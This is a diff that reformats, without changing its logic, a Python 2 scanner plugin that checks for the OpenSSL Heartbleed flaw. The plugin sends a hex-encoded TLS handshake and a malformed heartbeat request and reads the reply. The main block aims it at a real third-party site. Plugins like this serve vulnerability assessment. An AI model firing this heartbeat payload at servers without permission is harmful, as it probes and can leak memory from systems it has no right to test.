@@ -7,8 +7,10 @@ import socket
 import time
 import select
 
+
 def request2bin(x):
     return x.replace(' ', '').replace('\n', '').decode('hex')
+
 
 client_key_exchange = request2bin('''
 16 03 02 00  dc 01 00 00 d8 03 02 53
@@ -33,6 +35,7 @@ malformed_heartbeat = request2bin('''
 01 40 00
 ''')
 
+
 def get_msg_from_socket(some_socket, msg_length, time_out=5):
     end_time = time.time() + time_out
     received_data = ''
@@ -41,7 +44,8 @@ def get_msg_from_socket(some_socket, msg_length, time_out=5):
         read_time = end_time - time.time()
         if read_time < 0:
             return None
-        read_socket, write_socket, error_socket = select.select([some_socket], [], [], time_out)
+        read_socket, write_socket, error_socket = select.select(
+            [some_socket], [], [], time_out)
         if some_socket in read_socket:
             data = some_socket.recv(remaining_msg)
             if not data:
@@ -52,16 +56,19 @@ def get_msg_from_socket(some_socket, msg_length, time_out=5):
         else:
             pass
     return received_data
-        
+
+
 def recv_msg(a_socket):
     header = get_msg_from_socket(a_socket, 5)
     if header is None:
         return None, None, None
-    message_type, message_version, message_length = struct.unpack('>BHH', header)
+    message_type, message_version, message_length = struct.unpack(
+        '>BHH', header)
     message_payload = get_msg_from_socket(a_socket, message_length, 10)
     if message_payload is None:
         return None, None, None
     return message_type, message_version, message_payload
+
 
 def send_n_catch_heartbeat(our_socket):
     our_socket.send(malformed_heartbeat)
@@ -73,6 +80,7 @@ def send_n_catch_heartbeat(our_socket):
             return True
         if content_type == 21:
             return False
+
 
 def check_heardbeat(host='', port=0):
     local_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -87,18 +95,20 @@ def check_heardbeat(host='', port=0):
     local_socket.send(malformed_heartbeat)
     return send_n_catch_heartbeat(local_socket)
 
+
 def get_plugin_info():
     plugin_info = {
-        "name":"OpenSSL心脏出血",
-        "info":"可以提取部分心跳包获取内存中的敏感数据",
-        "level":"高危",
-        "type":"信息泄露",
-        "author":"Nearg1e@YSRC",
-        "source":1,
-        "url":"http://www.freebuf.com/articles/network/32171.html",
-        "keyword":"port:443"
+        "name": "OpenSSL心脏出血",
+        "info": "可以提取部分心跳包获取内存中的敏感数据",
+        "level": "高危",
+        "type": "信息泄露",
+        "author": "Nearg1e@YSRC",
+        "source": 1,
+        "url": "http://www.freebuf.com/articles/network/32171.html",
+        "keyword": "port:443"
     }
     return plugin_info
+
 
 def check(host, port, timeout):
     info = ''
@@ -108,6 +118,7 @@ def check(host, port, timeout):
             return info
     except Exception, e:
         pass
+
 
 if __name__ == '__main__':
     print check('baidu.com', 443)
